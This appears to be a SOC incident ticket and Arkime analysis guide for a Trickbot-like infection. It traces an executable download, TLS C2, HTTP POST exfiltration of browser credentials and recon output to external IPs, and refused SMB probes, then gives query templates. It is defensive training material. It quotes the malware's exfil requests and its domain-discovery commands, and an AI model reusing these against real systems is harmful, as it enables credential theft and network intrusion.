- Write domains defanged (`[.]`) and **mask secrets**.

Operator name, ticket link and evidence paths below are placeholders; the operation-log times are illustrative.

```text
#INDEX ENTRY#

[] -- 200311 2124 -- 10.3.11.194 LAPTOP-7XMV2SN -- Malware infection (Trickbot-like): exe download, credential theft and recon exfil via HTTP, TLS C2, failed SMB lateral movement -- <ticket-link>


#TICKET METADATA#

OPERATORS: <Analyst>

TIME OF INCIDENT: 200311 21:24:36 UTC

RELATED TICKETS:
N/A

DESCRIPTION OF INVESTIGATION:

At 200311 21:24:36 UTC LAPTOP-7XMV2SN (10.3.11.194, user otis.witherspoon, domain MONDOGREEK) made an HTTP GET (port 80) to 50.87.248.17 (bolton-tech[.]com) and downloaded the Windows executable YAS20.exe (466,944 bytes, application/x-msdownload). The request used the script User-Agent "WinHttp.WinHttpRequest.5" with no Referer, indicating it was fetched by a malicious script/document rather than a user browser. At 21:32:00 the host checked its public IP via checkip.amazonaws[.]com and from 21:32:07 established encrypted C2 over TLS to 190.214.13.2:449 (long-lived, low-byte sessions of 7-28 KB lasting 1-4 min, no fixed beacon interval, last session ended 21:46:06). A second C2 address 185.180.198.50:447 was attempted at 21:35:31 with no response. Additional payloads were downloaded: ~2.2 MB over TLS from 185.14.31.98:447 (self-signed cert CN example[.]com / O "Global Security" / OU "IT Department", created 200306), and cursor.png / imgpaper.png (~570 KB each, application/octet-stream, likely disguised executables) via HTTP from 64.44.133.131:80 using User-Agent "WinHTTP loader/1.0". Further encrypted downloads on 443 were made to hakunamatatata[.]com (199.247.13.144, 570 KB), helpforyourservice[.]com (209.97.130.197, 281 KB), filmstore[.]xyz (45.148.120.153) and 51.254.164.244 (self-signed); contents unknown.

Exfil occurred between 21:36:52 and 21:38:49 UTC via five cleartext HTTP POSTs (multipart/form-data) from 10.3.11.194 to 203.176.135.102:8082, URI /yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/<81|90>. Four /81/ POSTs (210-551 bytes) sent stolen browser credentials by source: IE passwords (facebook.com login for otis.witherspoon@mondogreek[.]com), Firefox passwords (accounts.firefox.com login with the SAME password, plus Firefox account tokens), and empty reports for OpenVPN configs and OpenSSH keys. The /90 POST (5,366 bytes) sent a full process list (incl. anomalous process "VMMM;;;;영상ثافوزبت.exe"), systeminfo and the output of ipconfig /all, net config workstation, net view /all (/domain), nltest /domain_trusts (/all_trusts), DC name Mondogreek-DC.mondogreek[.]com and admin account names. At 21:36:47 and 21:37:17 the host swept SMB port 445 on 10.3.11.119, 10.3.11.218, 10.3.11.1, 10.3.11.131 and 10.3.11.254 with SMBv1-only (NT LM 0.12) negotiate probes; all were refused (RST, 0 bytes returned), so lateral movement was attempted but NOT successful. No other internal host contacted any of the external IOCs. Determination: MALICIOUS - banking trojan / information stealer with modular downloader, pattern consistent with Trickbot (group tag "yas20"; unconfirmed, closed network). Credentials for otis.witherspoon are compromised. Further malware analysis of YAS20.exe, cursor.png and imgpaper.png is required.


#IMPACTED MACHINES#

INTERNAL IP/s & HOSTNAME/s:
10.3.11.194 LAPTOP-7XMV2SN (user otis.witherspoon, MAC b8:ca:3a:ec:3b:8f, Windows 10 Pro build 18363)

INTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)

LATERAL DESTINATION IP/s & HOSTNAME/s: (attempted only - refused)
10.3.11.119 LAPTOP-SQSA42O
10.3.11.218 LAPTOP-I9ZPI04
10.3.11.1 (default gateway)
10.3.11.131 (no response)
10.3.11.254 (no response)

LATERAL DESTINATION PORT/s:
Port 445 - SMB (SMBv1 negotiate probe)


#EXTERNAL MACHINES#

EXTERNAL IP/s & HOSTNAME/s:
50.87.248.17 (bolton-tech[.]com) - YAS20.exe download (HTTP 80)
64.44.133.131 - cursor.png / imgpaper.png download (HTTP 80)
203.176.135.102 - HTTP C2 / exfil (HTTP 8082)
190.214.13.2 - TLS C2 (449)
185.14.31.98 - TLS download channel, self-signed cert example[.]com (447)
185.180.198.50 - C2 attempted, no response (447)
51.254.164.244 - TLS, self-signed cert (443)
45.148.120.153 (filmstore[.]xyz) - TLS (443)
199.247.13.144 (hakunamatatata[.]com) - TLS download 570 KB (443)
209.97.130.197 (helpforyourservice[.]com) - TLS download 281 KB (443)
18.235.112.207 (checkip.amazonaws[.]com) - legitimate service, public IP lookup by malware (context only)

EXTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)

EXTERNAL DESTINATION PORT/s:
Port 80 - HTTP
Port 8082 - HTTP (non-standard)
Port 449 - TLS (non-standard)
Port 447 - TLS (non-standard)
Port 443 - TLS


#SEARCH QUERIES#

ARKIME (MOLOCH):
ip == 10.3.11.194 && ip == [50.87.248.17, 64.44.133.131, 203.176.135.102, 190.214.13.2, 185.14.31.98, 185.180.198.50, 51.254.164.244, 45.148.120.153, 199.247.13.144, 209.97.130.197]
ip.src == 10.3.11.194 && ip.dst == 10.3.11.0/24 && port.dst == 445

SPLUNK: (not run - Arkime-only analysis; equivalent Zeek query)
index=zeek sourcetype=conn:zeek id_orig_h=10.3.11.194 AND id_resp_h IN (50.87.248.17, 64.44.133.131, 203.176.135.102, 190.214.13.2, 185.14.31.98, 185.180.198.50, 51.254.164.244, 45.148.120.153, 199.247.13.144, 209.97.130.197)


#EVIDENCE LOCATIONS#

Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_YAS20_exe_download.pcap
Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_png_payload_download.pcap
Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_http8082_exfil_POST.pcap
Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_tls_c2_449_447.pcap
Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_smb445_sweep.pcap
(Exported from Arkime "Download PCAP". Full credentials/tokens are in the exfil PCAP only - masked in this ticket.)


#OPERATION LOG / ANALYST NOTES#

[251117 2000, Analyst] Establishing data time range and session count - Found
[251117 2003, Analyst] Reviewing protocol distribution and internal hosts - Found
[251117 2010, Analyst] Identifying host roles (DC) - Found
[251117 2015, Analyst] Mapping internal IPs to hostnames/users via Kerberos cname - Found
[251117 2020, Analyst] Checking external IP 52.242.211.89 seen as session initiator (possible inbound) - Not Found
[251117 2030, Analyst] Reviewing cleartext HTTP for executable downloads, raw-IP hosts, POST requests and unusual user agents - Found
[251117 2045, Analyst] Building timeline of suspicious HTTP sessions - Found
[251117 2105, Analyst] Collecting file type / Body MD5 of downloads from bolton-tech.com and 64.44.133.131 - Found
[251117 2110, Analyst] Inspecting POST /90 to 203.176.135.102:8082 for data upload - Found
[251117 2115, Analyst] Reviewing content of POST /90 body for exfiltrated data - Found
[251117 2120, Analyst] Reviewing content of POST /81/ body for exfiltrated data - Found
[251117 2125, Analyst] Reviewing remaining /81/ POSTs for credential sources - Found
[251117 2135, Analyst] Hunting outbound connections from 10.3.11.194 on non-standard ports - Found
[251117 2140, Analyst] Reviewing TLS certificates from 10.3.11.194 for self-signed / anomalous issuers - Found
[251117 2150, Analyst] Building timeline of TLS sessions to suspicious IPs / certificates (C2 hunt) - Found
[251117 2155, Analyst] Verifying self-signed certificate on 185.14.31.98:447 - Found
[251117 2205, Analyst] Checking for lateral movement from 10.3.11.194 to other internal hosts - Found
[251117 2210, Analyst] Verifying outcome of SMB probe to 10.3.11.119:445 - Not Found (no successful lateral movement)
[251117 2212, Analyst] Checking whether any other internal host contacted the external IOCs - Not Found

[Time -- Operator]

Tool Output / Notes:

[251117 2000, Analyst] Arkime, time range All. Data range 2020-03-11 21:22:35 - 22:06:41 UTC (44:06). 1,131 total sessions. Display timezone set to UTC.

[251117 2003, Analyst] SPI View (no filter). Internal network 10.3.11.0/24.
Src IP: 10.3.11.119 (491), 10.3.11.194 (377), 10.3.11.218 (259), 10.3.11.3 (3), 52.242.211.89 (1)
Protocols: tcp 672, udp 458, tls 349, dns 325, http2 126, ldap 79, krb5 78, http 44, dcerpc 41, smb 30, llmnr 29, ssdp 16, ntp 9, mdns 8, quic 6, igmp 1
Active Directory environment (ldap/krb5/dcerpc/smb). 3 workstations + 1 server.

[251117 2010, Analyst] Query: ip.dst == 10.3.11.3 -> 571 sessions. Protocols: udp 371, dns 325, tcp 200, ldap 79, krb5 78, dcerpc 41, smb 24, ntp 9. Src: 10.3.11.119 (251), 10.3.11.194 (170), 10.3.11.218 (150).
10.3.11.3 = Domain Controller / DNS (all krb5/ldap terminate here).

[251117 2015, Analyst] Query: ip.src == 10.3.11.0/24 && protocols == krb5 -> SPI View krb5 (cname/realm/sname).
Realm: MONDOGREEK.COM. DC: Mondogreek-DC.mondogreek.com (sname cifs/ldap)
10.3.11.3   Mondogreek-DC
10.3.11.119 LAPTOP-SQSA42O  user dorian.neff
10.3.11.194 LAPTOP-7XMV2SN  user otis.witherspoon
10.3.11.218 LAPTOP-I9ZPI04  user dominga.mcdowell

[251117 2020, Analyst] Query: ip.src == 52.242.211.89 -> 1 session.
200311 21:32:00 UTC 52.242.211.89:443 {ARIN} -> 10.3.11.194:50355 tcp, 2 packets, 283 bytes. TCP flags SYN 0 SYN-ACK 0 PSH 1 RST 1. Src MAC 20:e5:2a:b6:93:f1 (Netgear, gateway), Dst MAC b8:ca:3a:ec:3b:8f (Dell). Payload encrypted TLS record.
No handshake captured; mid-session server packet on 443 answered by client RST. Not an inbound connection. Benign.

[251117 2030, Analyst] Query: ip.src == 10.3.11.0/24 && protocols == http -> 44 sessions. SPI View http:
Body Magic: application/x-dosexec (2), application/octet-stream (2). Response content-type application/x-msdownload (1).
Request Method: GET 39, POST 5. Request content-type multipart/form-data (5, random boundaries).
Suspicious URIs:
 bolton-tech.com/YAS20.exe (1)
 64.44.133.131/images/cursor.png (2), 64.44.133.131/images/imgpaper.png (1)
 203.176.135.102:8082/yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/81/ (4), /90 (1)
 checkip.amazonaws.com/ (1)
Unusual User-Agents: KSKJJGJ (1), WinHTTP loader/1.0 (1), Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) (1), Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E) (4)
Benign: ctldl.windowsupdate.com, ocsp.digicert.com, crl.securetrust.com (Microsoft-CryptoAPI/10.0), fonts.googleapis.com / fonts.gstatic.com, *.wsimg.com, notable-quotes.com, newegg.com, tuscaloosabarnyard.com (user browsing, Edge/Chrome UA).
C2 URI contains victim hostname LAPTOP-7XMV2SN + Windows build 18363 + bot ID.

[251117 2045, Analyst] Query: host.http == bolton-tech.com || ip.dst == 64.44.133.131 || ip.dst == 203.176.135.102 || host.http == checkip.amazonaws.com -> 9 sessions, all from 10.3.11.194.
200311 21:24:36UTC 10.3.11.194 49727 50.87.248.17 80 GET 200 bolton-tech.com /YAS20.exe 1.1 Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
  Request headers only: Connection, Accept */*, User-Agent, Host (no Referer). Response: Server Apache, Content-Type application/x-msdownload, Content-Length 466944, Last-Modified Tue, 10 Mar 2020 11:32:37 GMT, host-header c2hhcmVkLmJsdWVob3N0LmNvbQ== (CyberChef From Base64 = shared.bluehost.com -> shared hosting, likely compromised site). 389 pkts, 488,507 bytes.
200311 21:32:00UTC 10.3.11.194 49787 18.235.112.207 80 GET checkip.amazonaws.com / (11 pkts, 950 bytes) - public IP check 7.5 min after download
200311 21:36:45UTC 10.3.11.194 49816 64.44.133.131 80 GET /images/cursor.png + /images/imgpaper.png (979 pkts, 1,218,352 bytes)
200311 21:36:52UTC 10.3.11.194 50080 203.176.135.102 8082 POST /yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/81/ (1,396 bytes)
200311 21:36:55UTC 10.3.11.194 50081 203.176.135.102 8082 POST .../81/ (1,673 bytes)
200311 21:36:57UTC 10.3.11.194 50082 64.44.133.131 80 GET /images/cursor.png (540 pkts, 611,579 bytes)
200311 21:36:59UTC 10.3.11.194 50091 203.176.135.102 8082 POST .../90 (6,771 bytes)
200311 21:37:19UTC 10.3.11.194 50098 203.176.135.102 8082 POST .../81/ (1,341 bytes)
200311 21:37:52UTC 10.3.11.194 50099 203.176.135.102 8082 POST .../81/ (1,332 bytes)
No further HTTP to these IPs until end of capture (22:06:41).

[251117 2105, Analyst] Query: host.http == bolton-tech.com || ip.dst == 64.44.133.131 -> 3 sessions.
Body Magic: application/x-dosexec (2).
Body MD5: 179345004c39336eaba39863b95f268b, 9dfb3952172deeddb3a5e3cafed933bc, e40d7846eae7d8a98c0e3512e5461e4c (HTTP bodies of YAS20.exe / cursor.png / imgpaper.png; per-file mapping not confirmed). Hash lookup not possible (closed network) - for malware analysis.
64.44.133.131 responses: HTTP/1.1 200 OK, Server nginx/1.6.2, malformed header "Content-Type: Content-type: application/octet-stream".
 imgpaper.png Content-Length 582656 (Date 21:36:59 GMT); cursor.png Content-Length 582144 (Date 21:37:06 GMT).
 Requests: GET /images/<file>.png, Cache-Control no-cache, Pragma no-cache, User-Agent WinHTTP loader/1.0, Host 64.44.133.131.
~570 KB "png" files from raw IP via downloader UA -> likely disguised executables.

[251117 2110, Analyst] /90 session: 200311 21:36:59-21:38:49 UTC 10.3.11.194 50091 203.176.135.102 {APNIC} 8082
POST /yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/90 HTTP/1.1, User-Agent KSKJJGJ, Content-Type multipart/form-data; boundary=aksgja8s8d8a8s97, Content-Length 5366, Cache-Control no-cache.
Src 10 pkts 6,161 bytes (databytes 5,609) / Dst 9 pkts 610 bytes (databytes 120) -> upload.
Response: 200 OK, server Cowboy, Content-Type text/plain, content-length 3, body "/1/" (acknowledgement).
Body MD5s: f09673ad745e39470708028f7431f6d6, fa06d89c65fb808240e37f4c9e128955.

[251117 2115, Analyst] /90 POST body (Packet Options > Hide Images & Files, ascii). Cleartext, 2 parts:
 name="proclist": "***TASK LIST***" full process list - System, smss.exe, csrss.exe, wininit.exe, winlogon.exe, services.exe, lsass.exe, svchost.exe ..., MsMpEng.exe, NisSrv.exe, explorer.exe, OfficeClickToRun.exe ...
   Anomalous process: "VMMM;;;;영상ثافوزبت.exe" (mixed Latin/Korean/Arabic) - likely malware process. Host IOC.
 name="sysinfo": "***SYSTEMINFO***" HostName LAPTOP-7XMV2SN, OSName Microsoft Windows 10 Pro, 64-bit, Workstation, RegisteredOwner admin, TotalPhysicalMemory 6493 Mb
   /c ipconfig /all - Host LAPTOP-7XMV2SN, DNS suffix mondogreek.com, MAC B8-CA-3A-EC-3B-8F, IPv4 10.3.11.194/24, GW 10.3.11.1, DHCP/DNS 10.3.11.3
   /c net config workstation - \\LAPTOP-7XMV2SN, user otis.witherspoon, domain MONDOGREEK
   /c net view /all ; /c net view /all /domain - System error 6118
   /c nltest /domain_trusts ; /c nltest /domain_trusts /all_trusts - 0: MONDOGREEK mondogreek.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)
   ***LOCAL MACHINE DATA*** User CN=Otis Witherspoon,CN=Users,DC=mondogreek,DC=com; Computer CN=LAPTOP-7XMV2SN,CN=Computers,DC=mondogreek,DC=com; Domain controller Mondogreek-DC.mondogreek.com; Admin Name: Administrator (x3)
 MAC in ipconfig matches Arkime Src Ethernet b8:ca:3a:ec:3b:8f.
Exfil of host/network/domain reconnaissance. ATT&CK: T1057, T1082, T1016, T1482, T1087 (Discovery); T1041 (Exfiltration Over C2 Channel). Domain trust and admin enumeration = preparation for lateral movement.

[251117 2120, Analyst] 200311 21:36:52-21:36:54 UTC 10.3.11.194 50080 203.176.135.102 8082 POST .../81/
User-Agent Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E), Accept */*, boundary ---------ATBOXLGQOOBDZTLA, Content-Length 274, Connection Close.
 name="data": https://www.facebook.com/|otis.witherspoon@mondogreek.com|P@ss********  (URL|user|password, cleartext - masked, full value in PCAP)
 name="source": IE passwords
Response 200, server Cowboy, content-length 3.
Credential theft from browser store. ATT&CK T1555.003, T1041.

[251117 2125, Analyst] Remaining /81/ POSTs (same fake MSIE 7.0 UA, random boundaries, reply "/1/"):
200311 21:36:55UTC 10.3.11.194 50081 -> 203.176.135.102 8082, Content-Length 551, boundary ---------XWQEFTQLCLTQBJQE, source "firefox passwords"
 data: chrome://FirefoxAccounts|<account id>|{"version":1,"accountData":{"keyFetchToken":"<masked>","unwrapBKey":"<masked>"}} ; https://accounts.firefox.com|otis.witherspoon@mondogreek.com|P@ss******** (same password as Facebook) ; "No passwords found"
200311 21:37:19UTC 10.3.11.194 50098 -> 203.176.135.102 8082, Content-Length 219, boundary ---------MDLIZHCZZMRSOFHE, source "OpenVPN passwords and configs", data empty
200311 21:37:52UTC 10.3.11.194 50099 -> 203.176.135.102 8082, Content-Length 210, boundary ---------TAGOVQVWGJFPBAJU, source "OpenSSH private keys", data empty
/81/ = credential module reporting per source. Password reuse across sites -> high risk the domain password is the same. OpenVPN/OpenSSH: nothing stolen.

[251117 2135, Analyst] Query: ip.src == 10.3.11.194 && ip.dst != 10.0.0.0/8 && port.dst != 80 && port.dst != 443 && port.dst != 53 -> 26 sessions.
Dst IP: 190.214.13.2 (6), 224.0.0.252 (6), 203.176.135.102 (5), 185.14.31.98 (3), 239.255.255.250 (3), 224.0.0.251 (2), 185.180.198.50 (1)
Protocols: tcp 15, udp 11, tls 9, llmnr 6, http 5, ssdp 3, mdns 2
224.0.0.252 / 239.255.255.250 / 224.0.0.251 = LLMNR / SSDP / mDNS multicast (benign). 9 TLS sessions on non-standard ports to raw external IPs.

[251117 2140, Analyst] Query: ip.src == 10.3.11.194 && protocols == tls -> SPI View cert. Mostly Microsoft / Baltimore / DigiCert / Let's Encrypt (benign).
Anomalous: Issuer & Subject CN example.com (4), Issuer & Subject ON "Global Security" / OU "IT Department" (4); Issuer & Subject ON "Internet Widgits Pty Ltd" (2, OpenSSL default); Subject CN filmstore.xyz (1), hakunamatatata.com (1), helpforyourservice.com (1); Issuer cPanel, Inc. (1).

[251117 2150, Analyst] Query: ip.src == 10.3.11.194 && (ip.dst == 190.214.13.2 || ip.dst == 185.14.31.98 || ip.dst == 185.180.198.50 || cert.issuer.cn == example.com || cert.issuer.on == "Internet Widgits Pty Ltd" || cert.subject.cn == [filmstore.xyz, hakunamatatata.com, helpforyourservice.com]) -> 14 sessions:
200311 21:31:58UTC 10.3.11.194 49783 45.148.120.153 443 tls, cert:certificate-authority (cPanel), Alt Name filmstore.xyz, cpanel.filmstore.xyz, cpcalendars.filmstore.xyz - 68 pkts, 62,330 bytes
200311 21:31:59UTC 10.3.11.194 49784 51.254.164.244 443 tls, cert:self-signed - 107 pkts, 61,538 bytes
200311 21:32:07UTC 10.3.11.194 49788 190.214.13.2 449 tls - 32 pkts, 7,821 bytes (until 21:33:16)
200311 21:35:31UTC 10.3.11.194 49793 185.180.198.50 447 tcp - 6 pkts, 0 databytes / 384 bytes (no response)
200311 21:35:53UTC 10.3.11.194 49808 185.14.31.98 447 tls, cert:self-signed - 1,666 pkts, 2,049,123 databytes / 2,139,108 bytes (until 21:38:14)
200311 21:35:55UTC 10.3.11.194 49809 190.214.13.2 449 tls - 136 pkts, 27,788 bytes (until 21:39:37)
200311 21:35:58UTC 10.3.11.194 49810 190.214.13.2 449 tls - 117 pkts, 22,607 bytes (until 21:39:31)
200311 21:37:01UTC 10.3.11.194 50092 190.214.13.2 449 tls - 48 pkts, 7,801 bytes (until 21:39:57)
200311 21:42:12UTC 10.3.11.194 50112 190.214.13.2 449 tls - 52 pkts, 11,301 bytes (until 21:46:06)
200311 21:42:13UTC 10.3.11.194 50113 185.14.31.98 447 tls, cert:self-signed - 35 pkts, 24,643 bytes
200311 21:42:17UTC 10.3.11.194 50114 190.214.13.2 449 tls - 43 pkts, 7,964 bytes (until 21:46:06)
200311 21:43:40UTC 10.3.11.194 50128 199.247.13.144 443 tls, cert:certificate-authority, Alt Name hakunamatatata.com - 518 pkts, 569,667 bytes
200311 21:43:51UTC 10.3.11.194 50131 209.97.130.197 443 tls, cert:certificate-authority, Alt Name helpforyourservice.com - 243 pkts, 281,286 bytes
200311 21:44:02UTC 10.3.11.194 50136 185.14.31.98 447 tls, cert:self-signed - Src 29 pkts 2,185 bytes / Dst 82 pkts 111,326 bytes (download)
C2 assessment: 190.214.13.2:449 = persistent C2 (long-lived low-byte sessions, no fixed interval, active 21:32:07-21:46:06). 185.14.31.98:447 = module/payload download channel. 185.180.198.50:447 = C2 attempted, unreachable. No C2 traffic after 21:46:06.

[251117 2155, Analyst] Session 200311 21:44:02 10.3.11.194:50136 -> 185.14.31.98:447 {RIPE}
TLSv1.2, TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, JA3 72a589da586844d7f0818ce684948eea, JA3S e35df3e00ca4ef31d42b34bebaa2f86e, JA4 t12i190700_d83cc789557e_16bbda4055b2
Certificate (single): Serial 008be295cd71603289, Not Before 2020/03/06 09:53:10 UTC, Not After 2021/03/06 09:53:10 UTC (365 days)
Issuer CN example.com, O Global Security, OU IT Department = Subject CN example.com, O Global Security, OU IT Department -> self-signed confirmed. Certificate created 5 days before incident.

[251117 2205, Analyst] Query: ip.src == 10.3.11.194 && ip.dst == 10.3.11.0/24 && ip.dst != 10.3.11.3 -> 20 sessions.
UDP 137/138 -> 10.3.11.255 single packets at 21:23:00, 21:23:05, 21:27:02, 21:35:00, 21:47:02, 21:59:04 (normal NetBIOS). Burst 21:36:19-21:37:21 (udp 137: 22 pkts 2,024 bytes; udp 138: 21 pkts 4,536 bytes) = "net view /all" seen in /90 exfil.
TCP 445 sweep at 200311 21:36:47UTC (sequential src ports 49818-49929):
 10.3.11.194 -> 10.3.11.119 445 smb x3 (5 pkts, 51 databytes / 345 bytes) + tcp x1 (6 pkts, 0 databytes)
 10.3.11.194 -> 10.3.11.218 445 smb x2 (5 pkts, 51 / 345) + tcp x1 (6 pkts, 0 databytes)
 10.3.11.194 -> 10.3.11.1 445 (2 pkts, 0 databytes); -> 10.3.11.254 445 (1 pkt); -> 10.3.11.131 445 (1 pkt) - no response
200311 21:37:17UTC 10.3.11.194 50097 -> 10.3.11.119 445 smb; 10.3.11.194 50095 -> 10.3.11.218 445 smb (5 pkts, 51 / 345 each)
Lateral movement attempt via SMB (ATT&CK T1021.002 attempt).

[251117 2210, Analyst] Session 200311 21:37:17 10.3.11.194:50097 -> 10.3.11.119:445 (Dst MAC 10:98:36:59:9d:cc Dell)
TCP flags SYN 1, SYN-ACK 1, ACK 1, PSH 1, RST 1. Src payload "\xffSMB r" = SMBv1 Negotiate Protocol Request offering only dialect "NT LM 0.12". Dst: 2 packets, 120 bytes, 0 databytes (SYN-ACK + RST, no SMB response).
SMBv1-only probe refused by target (SMBv1 disabled). No share, user or file activity. SMBv1-only probing is typical of EternalBlue-style worm spreading. Lateral movement NOT successful.

[251117 2212, Analyst] Query: ip.dst == [50.87.248.17, 64.44.133.131, 203.176.135.102, 190.214.13.2, 185.14.31.98, 185.180.198.50, 51.254.164.244, 45.148.120.153, 199.247.13.144, 209.97.130.197] && ip.src != 10.3.11.194 -> 0 sessions.
No other internal host contacted the external IOCs. 10.3.11.119 and 10.3.11.218 show no sign of infection in network data.

RECOMMENDATIONS:
- Isolate LAPTOP-7XMV2SN (10.3.11.194) and hand to host IR (Velociraptor triage: process "VMMM;;;;영상ثافوزبت.exe", YAS20.exe, persistence).
- Reset otis.witherspoon domain password and all reused passwords (Facebook, Firefox); revoke Firefox account sessions.
- Block external IOCs (IPs / domains above) at perimeter.
- Malware analysis of YAS20.exe, cursor.png, imgpaper.png (Body MD5 above).
- Confirm SMBv1 disabled on all hosts; monitor 10.3.11.119 / 10.3.11.218.
```

### Blank ticket template { #ticket-template }

```text
#INDEX ENTRY#

[] -- <YYMMDD HHMM> -- <IP> <hostname> -- <description> -- <ticket link>


#TICKET METADATA#

OPERATORS:

TIME OF INCIDENT: <YYMMDD HH:MM:SS> UTC

RELATED TICKETS:
[] -- <datetime> - <IP> <hostname> - <description> - <ticket link>

DESCRIPTION OF INVESTIGATION: (NO MORE THAN TWO PARAGRAPHS)
- Internal IPs with hostnames / external IPs with domains
- Protocol and port / directionality (who initiated)
- File names / verdict with malware type (if known)
- Life-cycle stages: initial access, C2 (interval, state, bytes), exfil (time, what, bytes, method)


#IMPACTED MACHINES#

INTERNAL IP/s & HOSTNAME/s:

INTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)

LATERAL DESTINATION IP/s & HOSTNAME/s: (If No Lateral Leave Blank.)

LATERAL DESTINATION PORT/s: (If No Lateral OR If Ephemeral Leave Blank.)


#EXTERNAL MACHINES#

EXTERNAL IP/s & HOSTNAME/s:

EXTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)

EXTERNAL DESTINATION PORT/s: (If Ephemeral Leave Blank.)


#SEARCH QUERIES#

ARKIME (MOLOCH):

SPLUNK:


#EVIDENCE LOCATIONS#

Team<#>: /home/<username>/<evidence folder>/<evidence filename>


#OPERATION LOG / ANALYST NOTES#

[<time>, <operator>] <what you're looking for> - <Found | Not Found | Further Analysis Required>

[Time -- Operator]

Tool Output / Notes:

[<time>, <operator>] <tool output with timestamps, src/dst, all interesting fields> + <what it means>
```

---

## Copy-ready query sheet { #query-sheet }

Replace `<…>`. If several labs are imported, prefix each search with `tags == <lab-tag> &&`.

**Orientation**

```text
ip.dst == <server-IP>
```

```text
ip.src == <internal-CIDR> && protocols == krb5
```

```text
ip.src == <host-IP> && protocols == krb5
```

```text
ip.src == <external-IP>
```

**HTTP**

```text
ip.src == <internal-CIDR> && protocols == http
```

```text
http.bodymagic == application/x-dosexec
```

```text
http.method == POST
```

```text
http.method == POST && ip.dst == <C2-IP> && http.uri == *<string>*
```

```text
http.user-agent == "<user-agent>"
```

```text
host.http == <domain> || ip.dst == <IP-1> || ip.dst == <IP-2>
```

**Hidden channels and certificates**

```text
ip.src == <host-IP> && ip.dst != 10.0.0.0/8 && ip.dst != 172.16.0.0/12 && ip.dst != 192.168.0.0/16 && ip.dst != 224.0.0.0/4 && port.dst != 80 && port.dst != 443 && port.dst != 53
```

```text
ip.src == <host-IP> && protocols == tls
```

```text
tags == "cert:self-signed"
```

```text
cert.issuer.cn == <name> || cert.issuer.on == "<org name>" || cert.subject.cn == [<domain-1>, <domain-2>]
```

```text
ip.src == <host-IP> && (ip.dst == <IP-1> || ip.dst == <IP-2> || cert.issuer.cn == <name>)
```

**Scope**

```text
ip.src == <host-IP> && ip.dst == <internal-CIDR> && ip.dst != <DC-IP>
```

```text
ip.src == <host-IP> && ip.dst == <internal-CIDR> && port.dst == [445, 135, 139, 3389, 5985]
```

```text
ip.dst == [<IOC-IP-1>, <IOC-IP-2>, <IOC-IP-3>] && ip.src != <host-IP>
```

**Where to click**

| Task | Where |
|---|---|
| Field values and counts | SPI View → section → click the field name or **Load All** |
| Add a value to the search | Click the value → **and** / **or** / **and not** |
| See the body instead of a file link | Session → **Packet Options → Hide Images & Files**, then `ascii` / `hex` |
| Raw bytes for CyberChef | Session → **Source Raw** (client side) / **Destination Raw** (server side) |
| Evidence for the ticket | Session → **Download PCAP** |
| Start/end of data | Sessions → sort **Start Time** ascending / **Stop Time** descending |
| Time zone | Settings → General → Timezone Format → **UTC** |

**CyberChef recipes used**

| Recipe | Used for |
|---|---|
| From Base64 | Odd header values ending in `=` / `==` |
| URL Decode | `%2F`-style encoded URIs and POST bodies |
| From UNIX Timestamp (ms) | Numbers like `1583961855884` in URLs → `2020-03-11 21:24:15 UTC` |
| Detect File Type / Strings | Bodies exported with Source/Destination Raw |
| Defang URL / Defang IP Addresses | IOC lists in tickets |

---

## Lessons learned { #lessons }

- **Fix the time range and time zone first** — most "Arkime shows nothing" moments are the Last-hour default.
- **SPI View counts, it does not pair.** A count that lines up (5 POSTs = 5 C2 URIs) is an **inference**. Confirm with a direct search or the session detail before writing it in a ticket.
- **Same name in Issuer and Subject is not proof of self-signing** — a chain does that too. Check inside one certificate, or use the `cert:self-signed` tag.
- **Separate noise before hunting:** Windows update/OCSP, fonts, CDNs, multicast and NetBIOS broadcast.
- **Cleartext C2 is a gift.** Hide Images & Files and read the POST bodies: here they named the victim, the stolen accounts and the attacker's next move.
- **Read TCP flags and byte direction** to tell "connected and transferred" from "probed and refused".
- **Ruling out is evidence too.** Log the benign external initiator, the refused SMB probes and the 0-result scope check as Not Found.
- **Mask secrets and defang IOCs** in anything others will read.
